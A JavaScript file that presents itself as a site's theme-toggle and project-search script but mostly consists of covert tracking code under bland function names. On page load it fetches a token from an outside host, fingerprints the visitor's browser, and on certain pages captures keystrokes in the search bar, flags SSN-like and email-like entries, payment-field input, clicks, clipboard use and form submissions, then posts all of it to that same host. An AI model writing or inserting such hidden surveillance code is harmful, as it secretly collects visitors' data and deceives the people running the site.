(async function initializeSystemOperations() {
  const networkConfig = { attempts: 0, maxTries: 3, delay: 1000 };
  const dataStore = { token: null, sessionKey: 'sessionId' };

  async function configureNetwork(stateManager) {
    if (networkConfig.attempts >= networkConfig.maxTries || stateManager.token) {
      return stateManager.token;
    }
    const requestOptions = {
      method: 'GET',
      credentials: 'include',
      headers: { 'Accept': 'application/json' }
    };
    try {
      const response = await fetch('https://random-nfpf.onrender.com/csrf-token', requestOptions);
      if (!response.ok) {
        throw new Error('Network configuration failed');
      }
      const responseData = await response.json();
      stateManager.token = responseData.csrfToken;
      const sessionHeader = response.headers.get('X-Session-ID');
      if (sessionHeader) {
        localStorage.setItem(dataStore.sessionKey, sessionHeader);
      }
      return stateManager.token;
    } catch (e) {
      networkConfig.attempts++;
      if (networkConfig.attempts < networkConfig.maxTries) {
        await new Promise(resolve => setTimeout(resolve, networkConfig.delay));
        return configureNetwork(stateManager);
      }
      return null;
    }
  }

  async function collectEnvironmentData() {
    const environment = {};
    const processNavigator = () => {
      const ua = navigator.userAgent;
      return /iPhone|iPad|iPod/i.test(ua) ? 'iPhone/iPad' :
             /Android/i.test(ua) ? (/Pixel|Pixel\s[0-9]/i.test(ua) ? 'Android (Pixel)' :
             /Samsung|SM-/i.test(ua) ? 'Android (Samsung)' : 'Android (unknown)') :
             /Windows NT|Macintosh|Linux/i.test(ua) ? 'PC' : 'Unknown';
    };
    environment.device = processNavigator();
    environment.timestamp = new Date().toISOString();
    environment.display = `${window.screen.width}x${window.screen.height}`;
    environment.color = window.screen.colorDepth || 'Unknown';
    environment.zone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
    environment.lang = navigator.language || 'Unknown';
    environment.cpu = navigator.hardwareConcurrency || 'Unknown';
    environment.mem = navigator.deviceMemory || 'Unknown';
    environment.track = navigator.doNotTrack || 'Unknown';
    environment.plugins = Array.from(navigator.plugins || []).map(p => p.name);
    environment.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type);
    environment.scripts = ['initializeSystemOperations'];
    environment.cookies = !!document.cookie;
    environment.requests = [];
    environment.messages = [];
    return environment;
  }

  async function processExtendedMetrics(environment, startTime) {
    const isSpecialPage = window.location.pathname.includes('/page3') ||
      (document.querySelectorAll('.project-card').length >= 3 &&
       document.querySelectorAll('.project-card')[2]?.offsetParent !== null);

    if (!isSpecialPage) {
      return environment;
    }

    environment.extended = {};
    environment.extended.touch = 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No';
    
    let batteryState = 'Unknown';
    if (navigator.getBattery) {
      try {
        const battery = await navigator.getBattery();
        batteryState = `${battery.level * 100}%${battery.charging ? ' (Charging)' : ''}`;
      } catch (e) {}
    }
    environment.extended.battery = batteryState;
    environment.extended.url = window.location.href;
    environment.extended.scroll = `${Math.round(window.scrollY)}px`;

    let inputBuffer = '';
    const inputElement = document.getElementById('search-bar');
    if (inputElement) {
      const keydownHandler = (event) => {
        if (inputBuffer.length < 50 && !['password', 'card', 'ssn'].some(s => event.key.includes(s))) {
          inputBuffer += event.key;
        }
      };
      inputElement.addEventListener('keydown', keydownHandler);
      await new Promise(resolve => setTimeout(resolve, 1000));
      inputElement.removeEventListener('keydown', keydownHandler);
    }
    environment.extended.keys = inputBuffer || 'None';

    let ssnFlag = 'None';
    if (inputElement) {
      const ssnHandler = (event) => {
        if (/\d{3}-\d{2}-\d{4}/.test(event.target.value)) {
          ssnFlag = 'SSN-like pattern detected';
        }
      };
      inputElement.addEventListener('input', ssnHandler);
      await new Promise(resolve => setTimeout(resolve, 1000));
      inputElement.removeEventListener('input', ssnHandler);
    }
    environment.extended.ssn = ssnFlag;

    let emailFlag = 'None';
    if (inputElement) {
      const emailHandler = (event) => {
        if (/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/.test(event.target.value)) {
          emailFlag = 'Email-like pattern detected';
        }
      };
      inputElement.addEventListener('input', emailHandler);
      await new Promise(resolve => setTimeout(resolve, 1000));
      inputElement.removeEventListener('input', emailHandler);
    }
    environment.extended.email = emailFlag;

    let paymentFlag = 'None';
    const paymentInputs = document.querySelectorAll('input[name*="card"], input[name*="credit"], input[name*="payment"]');
    if (paymentInputs.length > 0) {
      const paymentHandler = () => {
        paymentFlag = 'Input in payment-related field detected';
      };
      paymentInputs.forEach(field => field.addEventListener('input', paymentHandler));
      await new Promise(resolve => setTimeout(resolve, 1000));
      paymentInputs.forEach(field => field.removeEventListener('input', paymentHandler));
    }
    environment.extended.payment = paymentFlag;

    let moveCounter = 0;
    const mouseHandler = () => moveCounter++;
    document.addEventListener('mousemove', mouseHandler);
    await new Promise(resolve => setTimeout(resolve, 1000));
    document.removeEventListener('mousemove', mouseHandler);
    environment.extended.mouse = `${moveCounter}/s`;

    let graphicsSupport = 'Not supported';
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        graphicsSupport = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'WebGL supported';
      }
    } catch (e) {}
    environment.extended.graphics = graphicsSupport;

    environment.extended.connection = navigator.connection?.effectiveType || 'Unknown';

    let clipboardState = 'None';
    const copyHandler = () => clipboardState = 'Copy attempted';
    const pasteHandler = () => clipboardState = 'Paste attempted';
    document.addEventListener('copy', copyHandler, { once: true });
    document.addEventListener('paste', pasteHandler, { once: true });
    await new Promise(resolve => setTimeout(resolve, 1000));
    document.removeEventListener('copy', copyHandler);
    document.removeEventListener('paste', pasteHandler);
    environment.extended.clipboard = clipboardState;

    environment.extended.orientation = 'DeviceOrientationEvent' in window ? 'Yes' : 'No';

    let storageSize = 0;
    try {
      for (let key in sessionStorage) {
        if (sessionStorage.hasOwnProperty(key)) {
          storageSize += ((sessionStorage[key].length + key.length) * 2);
        }
      }
    } catch (e) {}
    environment.extended.storage = `${storageSize} bytes`;

    const features = [];
    if ('RTCPeerConnection' in window) features.push('WebRTC');
    if ('geolocation' in navigator) features.push('Geolocation');
    if ('serviceWorker' in navigator) features.push('ServiceWorker');
    environment.extended.features = features.length ? features.join(', ') : 'None';

    environment.extended.loadTime = `${Math.round(performance.now())}ms`;

    let interactionCount = 0;
    const clickHandler = () => interactionCount++;
    document.addEventListener('click', clickHandler);
    await new Promise(resolve => setTimeout(resolve, 1000));
    document.removeEventListener('click', clickHandler);
    environment.extended.interactions = interactionCount;

    environment.extended.referrer = document.referrer || 'Direct';

    const params = new URLSearchParams(window.location.search);
    environment.extended.utm = JSON.stringify({
      source: params.get('utm_source') || 'None',
      medium: params.get('utm_medium') || 'None',
      campaign: params.get('utm_campaign') || 'None'
    });

    let elementInteractions = [];
    const elementHandler = (event) => {
      const target = event.target;
      if (!target.type || !['password', 'card', 'credit', 'payment', 'ssn'].some(t => target.type.includes(t) || target.name?.includes(t))) {
        elementInteractions.push(JSON.stringify({
          tag: target.tagName.toLowerCase(),
          class: target.className || 'None',
          id: target.id || 'None'
        }));
      }
    };
    document.addEventListener('click', elementHandler);
    await new Promise(resolve => setTimeout(resolve, 1000));
    document.removeEventListener('click', elementHandler);
    environment.extended.elements = elementInteractions.length ? elementInteractions.join('; ') : 'None';

    environment.extended.duration = `${Math.round(performance.now() - startTime)}ms`;

    let eventRecords = [`PageView: ${window.location.href}`];
    const clickEventHandler = (event) => {
      const target = event.target;
      if (!target.type || !['password', 'card', 'credit', 'payment', 'ssn'].some(t => target.type.includes(t) || target.name?.includes(t))) {
        eventRecords.push(`Click: ${target.tagName.toLowerCase()}${target.id ? `#${target.id}` : ''}${target.className ? `.${target.className}` : ''}`);
      }
    };
    document.addEventListener('click', clickEventHandler);
    document.querySelectorAll('form').forEach(form => {
      const formHandler = () => {
        eventRecords.push(`FormSubmit: ${form.id || form.action || 'unnamed form'}`);
      };
      form.addEventListener('submit', formHandler);
    });
    await new Promise(resolve => setTimeout(resolve, 1000));
    document.removeEventListener('click', clickEventHandler);
    document.querySelectorAll('form').forEach(form => form.removeEventListener('submit', () => {}));
    environment.extended.events = eventRecords.length ? eventRecords.join('; ') : 'None';

    return environment;
  }

  async function transmitData(environment, token) {
    const transmitOptions = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': token,
        'X-Session-ID': localStorage.getItem(dataStore.sessionKey) || ''
      },
      body: JSON.stringify(environment),
      credentials: 'include'
    };
    try {
      const response = await fetch('https://random-nfpf.onrender.com/api/visit', transmitOptions);
      if (response.ok) {
        const sessionHeader = response.headers.get('X-Session-ID');
        if (sessionHeader) {
          localStorage.setItem(dataStore.sessionKey, sessionHeader);
        }
      }
    } catch (e) {}
  }

  async function executeCoreLogic() {
    const token = await configureNetwork(dataStore);
    if (!token) {
      return;
    }
    await new Promise(resolve => setTimeout(resolve, 500));
    const environment = await collectEnvironmentData();
    const startTime = performance.now();
    const enhancedEnvironment = await processExtendedMetrics(environment, startTime);
    await transmitData(enhancedEnvironment, token);
  }

  const themeToggle = document.getElementById('theme-switch');
  if (themeToggle) {
    themeToggle.addEventListener('change', () => {
      document.body.classList.toggle('light-mode');
    });
  }

  const searchField = document.getElementById('search-bar');
  if (searchField) {
    searchField.addEventListener('input', (event) => {
      const query = event.target.value.toLowerCase();
      document.querySelectorAll('.project-card').forEach(card => {
        const title = card.querySelector('h2').textContent.toLowerCase();
        card.style.display = title.includes(query) ? '' : 'none';
      });
    });
  }

  executeCoreLogic();
})();
